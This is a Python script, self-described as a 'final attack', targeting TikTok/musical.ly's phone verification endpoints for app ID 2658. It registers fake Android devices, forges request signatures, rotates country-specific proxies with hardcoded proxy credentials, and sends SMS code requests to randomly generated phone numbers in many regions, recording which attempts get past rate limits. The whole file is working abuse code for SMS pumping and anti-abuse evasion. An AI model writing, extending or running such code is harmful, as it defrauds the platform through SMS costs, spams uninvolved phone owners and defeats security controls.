"""
Final focused attack on AID=2658.
Try EVERYTHING: web endpoint, mobile signed, different regions, different phone formats,
Australian numbers (AU worked best), German numbers, Singapore numbers.
Use regions that showed success for other apps.
"""
import requests, random, time, json, hashlib, uuid, urllib3
from urllib.parse import urlencode
urllib3.disable_warnings()
from SignerPy import sign as sp_sign, xor

PROXY_TEMPLATE = 'http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080'

# Regions that showed success for other apps
WINNING_REGIONS = ["AU", "DE", "SG", "GB", "NL", "JP", "CA", "FR", "US", "BR", "IN", "ID", "KR", "MY", "TH", "VN", "PH"]

# Phone pools - match region to local numbers
PHONE_POOLS = {
    "AU": ["+614"], "DE": ["+4915", "+4917"], "SG": ["+658", "+659"],
    "GB": ["+4477"], "NL": ["+316"], "JP": ["+8190", "+8180"],
    "CA": ["+1647"], "FR": ["+336", "+337"], "US": ["+1202", "+1305"],
    "BR": ["+5511"], "IN": ["+9198", "+9199"], "ID": ["+6281", "+6282"],
    "KR": ["+8210"], "MY": ["+6012"], "TH": ["+6608", "+6609"],
    "VN": ["+8490"], "PH": ["+639"],
}

# AID=2658 configs to try
CONFIGS = [
    {"aid": 2658, "app_name": "musical_ly", "note": "musical_ly"},
    {"aid": 2658, "app_name": "lemon8", "note": "lemon8"},
    {"aid": 2658, "app_name": "tiktok_web", "note": "web_tiktok"},
]

# Domains that showed rate-limited (=working) for 2658
SIGNED_DOMAINS = [
    "api16-normal-v4.tiktokv.com",
    "api16-normal-v6.tiktokv.com",
    "api-t2.tiktokv.com",
    "api16-normal-c-useast2a.tiktokv.com",
    "api19-normal-c-useast2a.tiktokv.com",
    "api.lemon8-app.com",
    "api2-16-h2.musical.ly",
    "api16-normal-useast5.us.tiktokv.com",
]
WEB_DOMAINS = ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"]
ALL_TC = [3532, 3635, 3637, 3634, 3631, 3733, 3734, 3132]

def get_phone(region):
    prefixes = PHONE_POOLS.get(region, ["+44770"])
    return random.choice(prefixes) + str(random.randint(1000000, 9999999))

def register_device(aid, app_name, proxy, domain="api3-normal-c-lf.amemv.com"):
    brands = [("Samsung","SM-G991B","13","33"), ("Google","Pixel 7","14","34"), 
              ("Samsung","SM-S908B","14","34"), ("Xiaomi","M2102K1G","12","31")]
    b, m, av, api = random.choice(brands)
    openudid = ''.join(random.choices('0123456789abcdef', k=16))
    cdid = str(uuid.uuid4()); ts = int(time.time())
    params = {"aid": str(aid), "app_name": app_name, "version_code": "350804",
              "version_name": "35.8.4", "device_platform": "android", "os": "android",
              "os_api": api, "os_version": av, "device_type": m, "device_brand": b,
              "language": "en", "ac": "wifi", "channel": "googleplay",
              "resolution": "1080*2400", "dpi": "420", "openudid": openudid,
              "cdid": cdid, "ts": str(ts), "_rticket": str(ts*1000)}
    body = json.dumps({"magic_tag": "ss_app_log", "header": {
        "display_name": f"App_{aid}", "update_version_code": 350804, "manifest_version_code": 350804,
        "aid": aid, "channel": "googleplay", "package": "com.zhiliaoapp.musically",
        "app_version": "35.8.4", "version_code": 350804, "sdk_version": "2.14.0-rc.8",
        "os": "Android", "os_version": av, "os_api": int(api), "device_model": m,
        "device_brand": b, "device_manufacturer": b, "cpu_abi": "arm64-v8a",
        "release_build": "f66b21c_20241009", "density_dpi": 420,
        "display_density": "xxhdpi", "resolution": "1080x2400", "language": "en",
        "timezone": 1, "access": "wifi", "cdid": cdid, "sig_hash": "aea615ab",
        "openudid": openudid, "clientudid": str(uuid.uuid4()), "region": "US"}, "_gen_ts": ts})
    url = f"https://{domain}/service/2/device_register/?{urlencode(params)}"
    ua = f"com.zhiliaoapp.musically/350804 (Linux; U; Android {av}; en_US; {m}; Build/TQ3A.230901.001)"
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers={"Host": domain, "User-Agent": ua,
                   "Content-Type": "application/json"}, verify=False, timeout=12)
        if r.status_code == 200:
            d = r.json()
            return {"device_id": str(d["device_id"]), "iid": str(d["install_id"]),
                    "brand": b, "model": m, "av": av, "api": api, "openudid": openudid,
                    "cdid": cdid, "ua": ua,
                    "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
                    "csrf": ''.join(random.choices('0123456789abcdef', k=32))}
    except: pass
    finally: s.close()
    return None

def send_signed(domain, cfg, phone, tc, proxy, dev):
    encrypted = xor(phone)
    ts = int(time.time()); rticket = str(ts * 1000 + random.randint(1000, 9999))
    common = {"passport-sdk-version": "50559", "iid": dev["iid"], "device_id": dev["device_id"],
              "ac": "wifi", "channel": "googleplay", "aid": str(cfg["aid"]),
              "app_name": cfg["app_name"], "version_code": "350804", "version_name": "35.8.4",
              "device_platform": "android", "os": "android", "ssmix": "a",
              "device_type": dev["model"], "device_brand": dev["brand"], "language": "en",
              "os_api": dev["api"], "os_version": dev["av"],
              "manifest_version_code": "350804", "resolution": "1080*2400", "dpi": "420",
              "update_version_code": "350804", "cdid": dev["cdid"], "carrier_region": "US"}
    url_p = dict(common); url_p["_rticket"] = rticket; url_p["ts"] = str(ts)
    body_p = dict(common)
    body_p.update({"auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35",
                   "mix_mode": "1", "mobile": encrypted, "type": str(tc), "_rticket": rticket, "ts": str(ts)})
    url_str = urlencode(url_p); body = urlencode(body_p)
    cookies = f"odin_tt={dev['odin_tt']}; install_id={dev['iid']}; passport_csrf_token_default={dev['csrf']}"
    sigs = sp_sign(params=url_str, payload=body, cookie=cookies, version=8404, aid=cfg["aid"])
    headers = {"Host": domain, "Cookie": cookies, "X-SS-REQ-TICKET": rticket,
               "sdk-version": "2", "passport-sdk-version": "50559",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "X-SS-DP": str(cfg["aid"]), "User-Agent": dev["ua"],
               "X-Gorgon": sigs.get("x-gorgon",""), "X-Khronos": sigs.get("x-khronos",str(ts)),
               "X-Argus": sigs.get("x-argus",""), "X-Ladon": sigs.get("x-ladon",""),
               "X-SS-STUB": sigs.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper())}
    url = f"https://{domain}/passport/mobile/send_code/v1/?{url_str}"
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "raw": json.dumps(d)[:200]}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "raw": str(e)[:100]}
    finally: s.close()

def send_web(domain, cfg, phone, tc, proxy):
    encrypted = ''.join(format(ord(c) ^ 5, '02x') for c in phone)
    body = urlencode({"mobile": encrypted, "type": str(tc), "aid": str(cfg["aid"]),
                      "app_name": cfg["app_name"], "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0"})
    url = f"https://{domain}/passport/web/send_code/?aid={cfg['aid']}&app_name={cfg['app_name']}"
    headers = {"Host": domain, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json",
               "Origin": f"https://{domain}", "Referer": f"https://{domain}/", "X-SS-DP": str(cfg["aid"])}
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "raw": json.dumps(d)[:200]}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "raw": str(e)[:100]}
    finally: s.close()

if __name__ == "__main__":
    print("AID=2658 FINAL ATTACK — ALL METHODS × ALL REGIONS")
    print("="*70)
    successes = []
    tested = 0
    
    # Method 1: Signed mobile — try 17 regions × 8 domains × top type codes
    print("\n--- METHOD 1: Signed mobile, rotating regions ---")
    for region in WINNING_REGIONS:
        proxy = PROXY_TEMPLATE.format(region=region)
        for domain in random.sample(SIGNED_DOMAINS, min(3, len(SIGNED_DOMAINS))):
            tc = random.choice([3532, 3635, 3637])
            phone = get_phone(region)
            cfg = CONFIGS[0]  # musical_ly
            dev = register_device(cfg["aid"], cfg["app_name"], proxy)
            tested += 1
            if not dev:
                print(f"  [{region:3}] {domain[:35]:35} reg FAIL")
                continue
            r = send_signed(domain, cfg, phone, tc, proxy, dev)
            if r["msg"] == "success":
                print(f"\n  *** SUCCESS *** region={region} domain={domain} tc={tc} phone={phone}")
                successes.append({"method": "signed", "region": region, "domain": domain, "tc": tc, "phone": phone, "cfg": cfg["note"]})
            elif r["ec"] == 7:
                print(f"  [{region:3}] {domain[:35]:35} tc={tc} RL")
            else:
                print(f"  [{region:3}] {domain[:35]:35} tc={tc} ec={r['ec']} msg={r['msg']!r}")
            time.sleep(1)
    
    # Method 2: Web endpoint — try on web domains × regions
    print("\n--- METHOD 2: Web endpoint (no signing) ---")
    for region in WINNING_REGIONS[:8]:
        proxy = PROXY_TEMPLATE.format(region=region)
        for domain in WEB_DOMAINS:
            for tc in [3532, 3635]:
                phone = get_phone(region)
                for cfg in CONFIGS:
                    tested += 1
                    r = send_web(domain, cfg, phone, tc, proxy)
                    if r["msg"] == "success":
                        print(f"\n  *** SUCCESS *** region={region} domain={domain} tc={tc} cfg={cfg['note']} phone={phone}")
                        successes.append({"method": "web", "region": region, "domain": domain, "tc": tc, "phone": phone, "cfg": cfg["note"]})
                    elif r["ec"] == 7 or r["ec"] == 1206:
                        print(f"  [{region:3}] web {domain[:25]:25} tc={tc} cfg={cfg['note']:10} RL(ec={r['ec']})")
                    else:
                        print(f"  [{region:3}] web {domain[:25]:25} tc={tc} cfg={cfg['note']:10} ec={r['ec']} msg={r['msg']!r}")
                    time.sleep(0.5)
    
    # Method 3: Signed with SAME region number (e.g. AU proxy + AU number)
    print("\n--- METHOD 3: Matching region + number ---")
    for region in ["AU", "DE", "SG", "JP", "GB", "KR", "MY", "TH", "VN", "PH", "ID", "BR"]:
        proxy = PROXY_TEMPLATE.format(region=region)
        phone = get_phone(region)
        domain = random.choice(SIGNED_DOMAINS)
        tc = random.choice([3532, 3635])
        cfg = CONFIGS[0]
        dev = register_device(cfg["aid"], cfg["app_name"], proxy)
        tested += 1
        if not dev:
            print(f"  [{region:3}] match reg FAIL")
            continue
        r = send_signed(domain, cfg, phone, tc, proxy, dev)
        if r["msg"] == "success":
            print(f"\n  *** SUCCESS *** match region={region} domain={domain} tc={tc} phone={phone}")
            successes.append({"method": "match", "region": region, "domain": domain, "tc": tc, "phone": phone, "cfg": cfg["note"]})
        elif r["ec"] == 7:
            print(f"  [{region:3}] match {domain[:35]:35} RL")
        else:
            print(f"  [{region:3}] match ec={r['ec']} msg={r['msg']!r}")
        time.sleep(2)
    
    print(f"\n{'='*70}")
    print(f"COMPLETE: {tested} tests | SUCCESSES: {len(successes)}")
    for s in successes: print(f"  {s}")
    with open("/home/ubuntu/aid2658_final_results.json", "w") as f:
        json.dump({"successes": successes, "tested": tested}, f, indent=2, default=str)
    print("Saved to /home/ubuntu/aid2658_final_results.json")
